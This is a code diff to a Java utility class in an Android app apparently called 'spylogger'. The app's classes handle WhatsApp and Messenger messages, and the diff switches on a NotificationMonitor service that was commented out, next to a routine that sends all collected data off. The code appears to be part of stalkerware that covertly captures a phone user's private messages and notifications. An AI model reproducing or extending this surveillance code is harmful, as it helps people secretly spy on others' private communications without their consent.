@@ -33,6 +33,7 @@ import com.gravatasufoca.spylogger.model.TipoAcao;
 import com.gravatasufoca.spylogger.model.TipoMidia;
 import com.gravatasufoca.spylogger.model.messenger.Contact;
 import com.gravatasufoca.spylogger.receivers.Alarm;
+import com.gravatasufoca.spylogger.receivers.NotificationMonitor;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
@@ -619,9 +620,9 @@ public class Utils {
                     Utils.enviarTudo(context);
                 }
             }).execute(new WhatsAppService(context), new MessengerService(context));
+        }else{
+            startService(context, NotificationMonitor.class);
         }
-
-//        startService(context, NotificationMonitor.class);
     }
 
     public static void startDbObserver(Context context) {
